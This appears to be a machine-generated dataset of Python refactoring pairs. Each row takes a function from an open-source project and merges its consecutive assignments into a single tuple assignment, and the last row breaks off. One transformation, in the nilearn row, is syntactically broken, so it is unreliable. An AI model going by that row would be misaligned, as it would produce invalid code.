nova,https://github.com/openstack/nova/tree/master/nova/tests/functional/api_sample_tests/test_compare_result.py,TestCompareResult,test_none_result_no_match$455,"def test_none_result_no_match(self):
        """"""check result none and expected non-None response don't match""""""
        sample_data = u'foo'
        response_data = None

        with testtools.ExpectedException(api_samples_test_base.NoMatch):
            self.ast._compare_result(
                    expected=sample_data,
                    result=response_data,
                    result_str=""Test"")","sample_data = u'foo'
response_data = None","sample_data , response_data  = u'foo', None"
Paddle,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/fluid/tests/unittests/test_pool3d_op.py,TestCase1_AsyPadding,init_test_case$600,"def init_test_case(self):
        self.ksize = [3, 3, 4]
        self.strides = [1, 1, 2]","self.ksize = [3, 3, 4]
self.strides = [1, 1, 2]","self.ksize , self.strides  = [3, 3, 4], [1, 1, 2]"
attn2d,https://github.com/elbayadm/attn2d/tree/master/fairseq/sequence_generator.py,SequenceGeneratorWithAlignment,generate$825,"def generate(self, models, sample, **kwargs):
        self.model.reset_incremental_state()
        finalized = super()._generate(sample, **kwargs)

        src_tokens = sample[""net_input""][""src_tokens""]
        bsz = src_tokens.shape[0]
        beam_size = self.beam_size
        src_tokens, src_lengths, prev_output_tokens, tgt_tokens = self._prepare_batch_for_alignment(
            sample, finalized
        )
        if any(getattr(m, ""full_context_alignment"", False) for m in self.model.models):
            attn = self.model.forward_align(src_tokens, src_lengths, prev_output_tokens)
        else:
            attn = [
                finalized[i // beam_size][i % beam_size][""attention""].transpose(1, 0)
                for i in range(bsz * beam_size)
            ]

        # Process the attn matrix to extract hard alignments.
        for i in range(bsz * beam_size):
            alignment = utils.extract_hard_alignment(
                attn[i], src_tokens[i], tgt_tokens[i], self.pad, self.eos
            )
            finalized[i // beam_size][i % beam_size][""alignment""] = alignment
        return finalized","finalized = super()._generate(sample, **kwargs)
src_tokens = sample['net_input']['src_tokens']","finalized , src_tokens  = super()._generate(sample, **kwargs), sample['net_input']['src_tokens']"
attn2d,https://github.com/elbayadm/attn2d/tree/master/fairseq/sequence_generator.py,SequenceGeneratorWithAlignment,generate$825,"def generate(self, models, sample, **kwargs):
        self.model.reset_incremental_state()
        finalized = super()._generate(sample, **kwargs)

        src_tokens = sample[""net_input""][""src_tokens""]
        bsz = src_tokens.shape[0]
        beam_size = self.beam_size
        src_tokens, src_lengths, prev_output_tokens, tgt_tokens = self._prepare_batch_for_alignment(
            sample, finalized
        )
        if any(getattr(m, ""full_context_alignment"", False) for m in self.model.models):
            attn = self.model.forward_align(src_tokens, src_lengths, prev_output_tokens)
        else:
            attn = [
                finalized[i // beam_size][i % beam_size][""attention""].transpose(1, 0)
                for i in range(bsz * beam_size)
            ]

        # Process the attn matrix to extract hard alignments.
        for i in range(bsz * beam_size):
            alignment = utils.extract_hard_alignment(
                attn[i], src_tokens[i], tgt_tokens[i], self.pad, self.eos
            )
            finalized[i // beam_size][i % beam_size][""alignment""] = alignment
        return finalized","bsz = src_tokens.shape[0]
beam_size = self.beam_size","bsz , beam_size  = src_tokens.shape[0], self.beam_size"
python-dependency-injector,https://github.com/ets-labs/python-dependency-injector/tree/master/tests/unit/providers/test_provided_instance_py2_py3.py,,test_puzzled$168,"def test_puzzled():
    service = providers.Singleton(Service, value=""foo-bar"")

    dependency = providers.Object(
        {
            ""a"": {
                ""b"": {
                    ""c1"": 10,
                    ""c2"": lambda arg: {""arg"": arg}
                },
            },
        },
    )

    test_list = providers.List(
        dependency.provided[""a""][""b""][""c1""],
        dependency.provided[""a""][""b""][""c2""].call(22)[""arg""],
        dependency.provided[""a""][""b""][""c2""].call(service)[""arg""],
        dependency.provided[""a""][""b""][""c2""].call(service)[""arg""].value,
        dependency.provided[""a""][""b""][""c2""].call(service)[""arg""].get_value.call(),
    )

    result = test_list()
    assert result == [
        10,
        22,
        service(),
        ""foo-bar"",
        ""foo-bar"",
    ]","service = providers.Singleton(Service, value='foo-bar')
dependency = providers.Object({'a': {'b': {'c1': 10, 'c2': lambda arg: {'arg': arg}}}})","service , dependency  = providers.Singleton(Service, value='foo-bar'), providers.Object({'a': {'b': {'c1': 10, 'c2': lambda arg: {'arg': arg}}}})"
evalml,https://github.com/alteryx/evalml/tree/master/evalml/pipelines/component_graph.py,ComponentGraph,_validate_component_dict_edges$105,"def _validate_component_dict_edges(self):
        for _, component_inputs in self.component_dict.items():
            component_inputs = component_inputs[1:]
            has_feature_input = any(
                component_input.endswith("".x"") or component_input == ""X""
                for component_input in component_inputs
            )
            num_target_inputs = sum(
                component_input.endswith("".y"") or component_input == ""y""
                for component_input in component_inputs
            )
            if not has_feature_input:
                raise ValueError(
                    ""All components must have at least one input feature (.x/X) edge.""
                )
            if num_target_inputs != 1:
                raise ValueError(
                    ""All components must have exactly one target (.y/y) edge.""
                )

            def check_all_inputs_have_correct_syntax(edge):
                return not (
                    edge.endswith("".y"")
                    or edge == ""y""
                    or edge.endswith("".x"")
                    or edge == ""X""
                )

            if (
                len(
                    list(filter(check_all_inputs_have_correct_syntax, component_inputs))
                )
                != 0
            ):
                raise ValueError(
                    ""All edges must be specified as either an input feature ('X'/.x) or input target ('y'/.y).""
                )

            target_inputs = [
                component
                for component in component_inputs
                if (component.endswith("".y""))
            ]
            if target_inputs:
                target_component_name = target_inputs[0][:-2]
                target_component_class = self.get_component(target_component_name)
                if not target_component_class.modifies_target:
                    raise ValueError(
                        f""{target_inputs[0]} is not a valid input edge because {target_component_name} does not return a target.""
                    )","has_feature_input = any((component_input.endswith('.x') or component_input == 'X' for component_input in component_inputs))
num_target_inputs = sum((component_input.endswith('.y') or component_input == 'y' for component_input in component_inputs))","has_feature_input , num_target_inputs  = any((component_input.endswith('.x') or component_input == 'X' for component_input in component_inputs)), sum((component_input.endswith('.y') or component_input == 'y' for component_input in component_inputs))"
dcos,https://github.com/dcos/dcos/tree/master/packages/bootstrap/extra/dcos_internal_utils/cli.py,,dcos_bouncer$197,"def dcos_bouncer(b, opts):
    user = 'dcos_bouncer'

    rundir = utils.dcos_run_path / 'dcos-bouncer'
    _create_private_directory(path=rundir, owner=user)

    # Create the `TMPDIR` used by Bouncer.  This is not `/tmp` because many
    # systems mark `/tmp` as `noexec` but Bouncer needs to store executable
    # FFI files.  The security provided by `noexec` applies to directories
    # that are writable by multiple users.  This directory is writable only
    # by the owner, and hence is secure without `noexec`.
    bouncer_tmpdir = _known_exec_directory() / user
    _create_private_directory(path=bouncer_tmpdir, owner=user)","user = 'dcos_bouncer'
rundir = utils.dcos_run_path / 'dcos-bouncer'","user , rundir  = 'dcos_bouncer', utils.dcos_run_path / 'dcos-bouncer'"
Misago,https://github.com/rafalp/Misago/tree/master/misago/themes/admin/exporter.py,,write_theme_media$70,"def write_theme_media(export_dir, theme):
    files_dir = create_sub_directory(export_dir, ""media"")
    files = []

    for media in theme.media.all():
        files.append(
            {
                ""name"": media.name,
                ""type"": media.type,
                ""path"": copy_asset_file(files_dir, media.file),
            }
        )

    return files","files_dir = create_sub_directory(export_dir, 'media')
files = []","files_dir , files  = create_sub_directory(export_dir, 'media'), []"
nilearn,https://github.com/nilearn/nilearn/tree/master/nilearn/plotting/html_stat_map.py,,_get_bg_mask_and_cmap$314,"def _get_bg_mask_and_cmap(bg_img, black_bg):
    """"""Helper function of _json_view_data.""""""
    bg_mask = _safe_get_data(compute_brain_mask(bg_img),
                             ensure_finite=True)
    bg_mask = np.logical_not(bg_mask).astype(float)
    bg_mask[bg_mask == 1] = np.nan
    bg_cmap = copy.copy(matplotlib.cm.get_cmap('gray'))
    if black_bg:
        bg_cmap.set_bad('black')
    else:
        bg_cmap.set_bad('white')
    return bg_mask, bg_cmap","bg_mask[bg_mask == 1] = np.nan
bg_cmap = copy.copy(matplotlib.cm.get_cmap('gray'))","bg_mask[bg_mask , bg_cmap  = np.nan, copy.copy(matplotlib.cm.get_cmap('gray'))"
SOLO,https://github.com/WXinlong/SOLO/tree/master/mmdet/models/necks/nas_fpn.py,NASFPN,__init__$75,"def __init__(self,
                 in_channels,
                 out_channels,
                 num_outs,
                 stack_times,
                 start_level=0,
                 end_level=-1,
                 add_extra_convs=False,
                 norm_cfg=None):
        super(NASFPN, self).__init__()
        assert isinstance(in_channels, list)
        self.in_channels = in_channels
        self.out_channels = out_channels
        self.num_ins = len(in_channels)  # num of input feature levels
        self.num_outs = num_outs  # num of output feature levels
        self.stack_times = stack_times
        self.norm_cfg = norm_cfg

        if end_level == -1:
            self.backbone_end_level = self.num_ins
            assert num_outs >= self.num_ins - start_level
        else:
            # if end_level < inputs, no extra level is allowed
            self.backbone_end_level = end_level
            assert end_level <= len(in_channels)
            assert num_outs == end_level - start_level
        self.start_level = start_level
        self.end_level = end_level
        self.add_extra_convs = add_extra_convs

        # add lateral connections
        self.lateral_convs = nn.ModuleList()
        for i in range(self.start_level, self.backbone_end_level):
            l_conv = ConvModule(
                in_channels[i],
                out_channels,
                1,
                norm_cfg=norm_cfg,
                activation=None)
            self.lateral_convs.append(l_conv)

        # add extra downsample layers (stride-2 pooling or conv)
        extra_levels = num_outs - self.backbone_end_level + self.start_level
        self.extra_downsamples = nn.ModuleList()
        for i in range(extra_levels):
            extra_conv = ConvModule(
                out_channels,
                out_channels,
                1,
                norm_cfg=norm_cfg,
                activation=None)
            self.extra_downsamples.append(
                nn.Sequential(extra_conv, nn.MaxPool2d(2, 2)))

        # add NAS FPN connections
        self.fpn_stages = nn.ModuleList()
        for _ in range(self.stack_times):
            stage = nn.ModuleDict()
            # gp(p6, p4) -> p4_1
            stage['gp_64_4'] = GPCell(out_channels, norm_cfg=norm_cfg)
            # sum(p4_1, p4) -> p4_2
            stage['sum_44_4'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p4_2, p3) -> p3_out
            stage['sum_43_3'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p3_out, p4_2) -> p4_out
            stage['sum_34_4'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p5, gp(p4_out, p3_out)) -> p5_out
            stage['gp_43_5'] = GPCell(with_conv=False)
            stage['sum_55_5'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p7, gp(p5_out, p4_2)) -> p7_out
            stage['gp_54_7'] = GPCell(with_conv=False)
            stage['sum_77_7'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # gp(p7_out, p5_out) -> p6_out
            stage['gp_75_6'] = GPCell(out_channels, norm_cfg=norm_cfg)
            self.fpn_stages.append(stage)","self.in_channels = in_channels
self.out_channels = out_channels
self.num_ins = len(in_channels)
self.num_outs = num_outs
self.stack_times = stack_times
self.norm_cfg = norm_cfg","self.in_channels , self.out_channels , self.num_ins , self.num_outs , self.stack_times , self.norm_cfg  = in_channels, out_channels, len(in_channels), num_outs, stack_times, norm_cfg"
SOLO,https://github.com/WXinlong/SOLO/tree/master/mmdet/models/necks/nas_fpn.py,NASFPN,__init__$75,"def __init__(self,
                 in_channels,
                 out_channels,
                 num_outs,
                 stack_times,
                 start_level=0,
                 end_level=-1,
                 add_extra_convs=False,
                 norm_cfg=None):
        super(NASFPN, self).__init__()
        assert isinstance(in_channels, list)
        self.in_channels = in_channels
        self.out_channels = out_channels
        self.num_ins = len(in_channels)  # num of input feature levels
        self.num_outs = num_outs  # num of output feature levels
        self.stack_times = stack_times
        self.norm_cfg = norm_cfg

        if end_level == -1:
            self.backbone_end_level = self.num_ins
            assert num_outs >= self.num_ins - start_level
        else:
            # if end_level < inputs, no extra level is allowed
            self.backbone_end_level = end_level
            assert end_level <= len(in_channels)
            assert num_outs == end_level - start_level
        self.start_level = start_level
        self.end_level = end_level
        self.add_extra_convs = add_extra_convs

        # add lateral connections
        self.lateral_convs = nn.ModuleList()
        for i in range(self.start_level, self.backbone_end_level):
            l_conv = ConvModule(
                in_channels[i],
                out_channels,
                1,
                norm_cfg=norm_cfg,
                activation=None)
            self.lateral_convs.append(l_conv)

        # add extra downsample layers (stride-2 pooling or conv)
        extra_levels = num_outs - self.backbone_end_level + self.start_level
        self.extra_downsamples = nn.ModuleList()
        for i in range(extra_levels):
            extra_conv = ConvModule(
                out_channels,
                out_channels,
                1,
                norm_cfg=norm_cfg,
                activation=None)
            self.extra_downsamples.append(
                nn.Sequential(extra_conv, nn.MaxPool2d(2, 2)))

        # add NAS FPN connections
        self.fpn_stages = nn.ModuleList()
        for _ in range(self.stack_times):
            stage = nn.ModuleDict()
            # gp(p6, p4) -> p4_1
            stage['gp_64_4'] = GPCell(out_channels, norm_cfg=norm_cfg)
            # sum(p4_1, p4) -> p4_2
            stage['sum_44_4'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p4_2, p3) -> p3_out
            stage['sum_43_3'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p3_out, p4_2) -> p4_out
            stage['sum_34_4'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p5, gp(p4_out, p3_out)) -> p5_out
            stage['gp_43_5'] = GPCell(with_conv=False)
            stage['sum_55_5'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p7, gp(p5_out, p4_2)) -> p7_out
            stage['gp_54_7'] = GPCell(with_conv=False)
            stage['sum_77_7'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # gp(p7_out, p5_out) -> p6_out
            stage['gp_75_6'] = GPCell(out_channels, norm_cfg=norm_cfg)
            self.fpn_stages.append(stage)","self.start_level = start_level
self.end_level = end_level
self.add_extra_convs = add_extra_convs
self.lateral_convs = nn.ModuleList()","self.start_level , self.end_level , self.add_extra_convs , self.lateral_convs  = start_level, end_level, add_extra_convs, nn.ModuleList()"
SOLO,https://github.com/WXinlong/SOLO/tree/master/mmdet/models/necks/nas_fpn.py,NASFPN,__init__$75,"def __init__(self,
                 in_channels,
                 out_channels,
                 num_outs,
                 stack_times,
                 start_level=0,
                 end_level=-1,
                 add_extra_convs=False,
                 norm_cfg=None):
        super(NASFPN, self).__init__()
        assert isinstance(in_channels, list)
        self.in_channels = in_channels
        self.out_channels = out_channels
        self.num_ins = len(in_channels)  # num of input feature levels
        self.num_outs = num_outs  # num of output feature levels
        self.stack_times = stack_times
        self.norm_cfg = norm_cfg

        if end_level == -1:
            self.backbone_end_level = self.num_ins
            assert num_outs >= self.num_ins - start_level
        else:
            # if end_level < inputs, no extra level is allowed
            self.backbone_end_level = end_level
            assert end_level <= len(in_channels)
            assert num_outs == end_level - start_level
        self.start_level = start_level
        self.end_level = end_level
        self.add_extra_convs = add_extra_convs

        # add lateral connections
        self.lateral_convs = nn.ModuleList()
        for i in range(self.start_level, self.backbone_end_level):
            l_conv = ConvModule(
                in_channels[i],
                out_channels,
                1,
                norm_cfg=norm_cfg,
                activation=None)
            self.lateral_convs.append(l_conv)

        # add extra downsample layers (stride-2 pooling or conv)
        extra_levels = num_outs - self.backbone_end_level + self.start_level
        self.extra_downsamples = nn.ModuleList()
        for i in range(extra_levels):
            extra_conv = ConvModule(
                out_channels,
                out_channels,
                1,
                norm_cfg=norm_cfg,
                activation=None)
            self.extra_downsamples.append(
                nn.Sequential(extra_conv, nn.MaxPool2d(2, 2)))

        # add NAS FPN connections
        self.fpn_stages = nn.ModuleList()
        for _ in range(self.stack_times):
            stage = nn.ModuleDict()
            # gp(p6, p4) -> p4_1
            stage['gp_64_4'] = GPCell(out_channels, norm_cfg=norm_cfg)
            # sum(p4_1, p4) -> p4_2
            stage['sum_44_4'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p4_2, p3) -> p3_out
            stage['sum_43_3'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p3_out, p4_2) -> p4_out
            stage['sum_34_4'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p5, gp(p4_out, p3_out)) -> p5_out
            stage['gp_43_5'] = GPCell(with_conv=False)
            stage['sum_55_5'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p7, gp(p5_out, p4_2)) -> p7_out
            stage['gp_54_7'] = GPCell(with_conv=False)
            stage['sum_77_7'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # gp(p7_out, p5_out) -> p6_out
            stage['gp_75_6'] = GPCell(out_channels, norm_cfg=norm_cfg)
            self.fpn_stages.append(stage)","extra_levels = num_outs - self.backbone_end_level + self.start_level
self.extra_downsamples = nn.ModuleList()","extra_levels , self.extra_downsamples  = num_outs - self.backbone_end_level + self.start_level, nn.ModuleList()"
SOLO,https://github.com/WXinlong/SOLO/tree/master/mmdet/models/necks/nas_fpn.py,NASFPN,__init__$75,"def __init__(self,
                 in_channels,
                 out_channels,
                 num_outs,
                 stack_times,
                 start_level=0,
                 end_level=-1,
                 add_extra_convs=False,
                 norm_cfg=None):
        super(NASFPN, self).__init__()
        assert isinstance(in_channels, list)
        self.in_channels = in_channels
        self.out_channels = out_channels
        self.num_ins = len(in_channels)  # num of input feature levels
        self.num_outs = num_outs  # num of output feature levels
        self.stack_times = stack_times
        self.norm_cfg = norm_cfg

        if end_level == -1:
            self.backbone_end_level = self.num_ins
            assert num_outs >= self.num_ins - start_level
        else:
            # if end_level < inputs, no extra level is allowed
            self.backbone_end_level = end_level
            assert end_level <= len(in_channels)
            assert num_outs == end_level - start_level
        self.start_level = start_level
        self.end_level = end_level
        self.add_extra_convs = add_extra_convs

        # add lateral connections
        self.lateral_convs = nn.ModuleList()
        for i in range(self.start_level, self.backbone_end_level):
            l_conv = ConvModule(
                in_channels[i],
                out_channels,
                1,
                norm_cfg=norm_cfg,
                activation=None)
            self.lateral_convs.append(l_conv)

        # add extra downsample layers (stride-2 pooling or conv)
        extra_levels = num_outs - self.backbone_end_level + self.start_level
        self.extra_downsamples = nn.ModuleList()
        for i in range(extra_levels):
            extra_conv = ConvModule(
                out_channels,
                out_channels,
                1,
                norm_cfg=norm_cfg,
                activation=None)
            self.extra_downsamples.append(
                nn.Sequential(extra_conv, nn.MaxPool2d(2, 2)))

        # add NAS FPN connections
        self.fpn_stages = nn.ModuleList()
        for _ in range(self.stack_times):
            stage = nn.ModuleDict()
            # gp(p6, p4) -> p4_1
            stage['gp_64_4'] = GPCell(out_channels, norm_cfg=norm_cfg)
            # sum(p4_1, p4) -> p4_2
            stage['sum_44_4'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p4_2, p3) -> p3_out
            stage['sum_43_3'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p3_out, p4_2) -> p4_out
            stage['sum_34_4'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p5, gp(p4_out, p3_out)) -> p5_out
            stage['gp_43_5'] = GPCell(with_conv=False)
            stage['sum_55_5'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # sum(p7, gp(p5_out, p4_2)) -> p7_out
            stage['gp_54_7'] = GPCell(with_conv=False)
            stage['sum_77_7'] = SumCell(out_channels, norm_cfg=norm_cfg)
            # gp(p7_out, p5_out) -> p6_out
            stage['gp_75_6'] = GPCell(out_channels, norm_cfg=norm_cfg)
            self.fpn_stages.append(stage)","stage['gp_64_4'] = GPCell(out_channels, norm_cfg=norm_cfg)
stage['sum_44_4'] = SumCell(out_channels, norm_cfg=norm_cfg)
stage['sum_43_3'] = SumCell(out_channels, norm_cfg=norm_cfg)
stage['sum_34_4'] = SumCell(out_channels, norm_cfg=norm_cfg)
stage['gp_43_5'] = GPCell(with_conv=False)
stage['sum_55_5'] = SumCell(out_channels, norm_cfg=norm_cfg)
stage['gp_54_7'] = GPCell(with_conv=False)
stage['sum_77_7'] = SumCell(out_channels, norm_cfg=norm_cfg)
stage['gp_75_6'] = GPCell(out_channels, norm_cfg=norm_cfg)","stage['gp_64_4'] , stage['sum_44_4'] , stage['sum_43_3'] , stage['sum_34_4'] , stage['gp_43_5'] , stage['sum_55_5'] , stage['gp_54_7'] , stage['sum_77_7'] , stage['gp_75_6']  = GPCell(out_channels, norm_cfg=norm_cfg), SumCell(out_channels, norm_cfg=norm_cfg), SumCell(out_channels, norm_cfg=norm_cfg), SumCell(out_channels, norm_cfg=norm_cfg), GPCell(with_conv=False), SumCell(out_channels, norm_cfg=norm_cfg), GPCell(with_conv=False), SumCell(out_channels, norm_cfg=norm_cfg), GPCell(out_channels, norm_cfg=norm_cfg)"
pootle,https://github.com/translate/pootle/tree/master/tests/models/store_fs.py,,test_save_store_fs_bad_lang$195,"def test_save_store_fs_bad_lang(po_directory, tp0_store_fs):
    """"""Try to save a store with a non-existent lang code""""""
    tp0_store_fs.store = None
    tp0_store_fs.pootle_path = ""/fr/project0/example.po""

    with pytest.raises(ValidationError):
        tp0_store_fs.save()","tp0_store_fs.store = None
tp0_store_fs.pootle_path = '/fr/project0/example.po'","tp0_store_fs.store , tp0_store_fs.pootle_path  = None, '/fr/project0/example.po'"
django-ses,https://github.com/django-ses/django-ses/tree/master/tests/test_views.py,HandleEventTestCase,tearDown$212,"def tearDown(self):
        bounce_received.receivers = self._old_bounce_receivers
        complaint_received.receivers = self._old_complaint_receivers","bounce_received.receivers = self._old_bounce_receivers
complaint_received.receivers = self._old_complaint_receivers","bounce_received.receivers , complaint_received.receivers  = self._old_bounce_receivers, self._old_complaint_receivers"
mlxtend,https://github.com/rasbt/mlxtend/tree/master/mlxtend/classifier/tests/test_ensemble_vote_classifier.py,,test_sample_weight$87,"def test_sample_weight():
    # with no weight
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob1 = eclf.fit(X, y).predict_proba(X)

    # with weight = 1
    w = np.ones(len(y))
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob2 = eclf.fit(X, y, sample_weight=w).predict_proba(X)

    # with random weight
    random.seed(87)
    w = np.array([random.random() for _ in range(len(y))])
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob3 = eclf.fit(X, y, sample_weight=w).predict_proba(X)

    diff12 = np.max(np.abs(prob1 - prob2))
    diff23 = np.max(np.abs(prob2 - prob3))
    assert diff12 < 1e-3, ""max diff is %.4f"" % diff12
    assert diff23 > 1e-3, ""max diff is %.4f"" % diff23","clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
clf2 = RandomForestClassifier(n_estimators=10)
clf3 = GaussianNB()","clf1 , clf2 , clf3  = LogisticRegression(solver='liblinear', multi_class='ovr'), RandomForestClassifier(n_estimators=10), GaussianNB()"
mlxtend,https://github.com/rasbt/mlxtend/tree/master/mlxtend/classifier/tests/test_ensemble_vote_classifier.py,,test_sample_weight$87,"def test_sample_weight():
    # with no weight
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob1 = eclf.fit(X, y).predict_proba(X)

    # with weight = 1
    w = np.ones(len(y))
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob2 = eclf.fit(X, y, sample_weight=w).predict_proba(X)

    # with random weight
    random.seed(87)
    w = np.array([random.random() for _ in range(len(y))])
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob3 = eclf.fit(X, y, sample_weight=w).predict_proba(X)

    diff12 = np.max(np.abs(prob1 - prob2))
    diff23 = np.max(np.abs(prob2 - prob3))
    assert diff12 < 1e-3, ""max diff is %.4f"" % diff12
    assert diff23 > 1e-3, ""max diff is %.4f"" % diff23","prob1 = eclf.fit(X, y).predict_proba(X)
w = np.ones(len(y))","prob1 , w  = eclf.fit(X, y).predict_proba(X), np.ones(len(y))"
mlxtend,https://github.com/rasbt/mlxtend/tree/master/mlxtend/classifier/tests/test_ensemble_vote_classifier.py,,test_sample_weight$87,"def test_sample_weight():
    # with no weight
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob1 = eclf.fit(X, y).predict_proba(X)

    # with weight = 1
    w = np.ones(len(y))
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob2 = eclf.fit(X, y, sample_weight=w).predict_proba(X)

    # with random weight
    random.seed(87)
    w = np.array([random.random() for _ in range(len(y))])
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob3 = eclf.fit(X, y, sample_weight=w).predict_proba(X)

    diff12 = np.max(np.abs(prob1 - prob2))
    diff23 = np.max(np.abs(prob2 - prob3))
    assert diff12 < 1e-3, ""max diff is %.4f"" % diff12
    assert diff23 > 1e-3, ""max diff is %.4f"" % diff23","clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
clf2 = RandomForestClassifier(n_estimators=10)
clf3 = GaussianNB()","clf1 , clf2 , clf3  = LogisticRegression(solver='liblinear', multi_class='ovr'), RandomForestClassifier(n_estimators=10), GaussianNB()"
mlxtend,https://github.com/rasbt/mlxtend/tree/master/mlxtend/classifier/tests/test_ensemble_vote_classifier.py,,test_sample_weight$87,"def test_sample_weight():
    # with no weight
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob1 = eclf.fit(X, y).predict_proba(X)

    # with weight = 1
    w = np.ones(len(y))
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob2 = eclf.fit(X, y, sample_weight=w).predict_proba(X)

    # with random weight
    random.seed(87)
    w = np.array([random.random() for _ in range(len(y))])
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob3 = eclf.fit(X, y, sample_weight=w).predict_proba(X)

    diff12 = np.max(np.abs(prob1 - prob2))
    diff23 = np.max(np.abs(prob2 - prob3))
    assert diff12 < 1e-3, ""max diff is %.4f"" % diff12
    assert diff23 > 1e-3, ""max diff is %.4f"" % diff23","clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
clf2 = RandomForestClassifier(n_estimators=10)
clf3 = GaussianNB()","clf1 , clf2 , clf3  = LogisticRegression(solver='liblinear', multi_class='ovr'), RandomForestClassifier(n_estimators=10), GaussianNB()"
mlxtend,https://github.com/rasbt/mlxtend/tree/master/mlxtend/classifier/tests/test_ensemble_vote_classifier.py,,test_sample_weight$87,"def test_sample_weight():
    # with no weight
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob1 = eclf.fit(X, y).predict_proba(X)

    # with weight = 1
    w = np.ones(len(y))
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob2 = eclf.fit(X, y, sample_weight=w).predict_proba(X)

    # with random weight
    random.seed(87)
    w = np.array([random.random() for _ in range(len(y))])
    np.random.seed(123)
    clf1 = LogisticRegression(solver='liblinear', multi_class='ovr')
    clf2 = RandomForestClassifier(n_estimators=10)
    clf3 = GaussianNB()
    eclf = EnsembleVoteClassifier(clfs=[clf1, clf2, clf3], voting='hard')
    prob3 = eclf.fit(X, y, sample_weight=w).predict_proba(X)

    diff12 = np.max(np.abs(prob1 - prob2))
    diff23 = np.max(np.abs(prob2 - prob3))
    assert diff12 < 1e-3, ""max diff is %.4f"" % diff12
    assert diff23 > 1e-3, ""max diff is %.4f"" % diff23","diff12 = np.max(np.abs(prob1 - prob2))
diff23 = np.max(np.abs(prob2 - prob3))","diff12 , diff23  = np.max(np.abs(prob1 - prob2)), np.max(np.abs(prob2 - prob3))"
cfn-lint,https://github.com/aws-cloudformation/cfn-lint/tree/master/src/cfnlint/rules/functions/RelationshipConditions.py,RelationshipConditions,match$22,"def match(self, cfn):
        """"""Check CloudFormation Ref/GetAtt for Conditions""""""

        matches = []

        # Start with Ref checks
        ref_objs = cfn.search_deep_keys(searchText=""Ref"", includeGlobals=False)
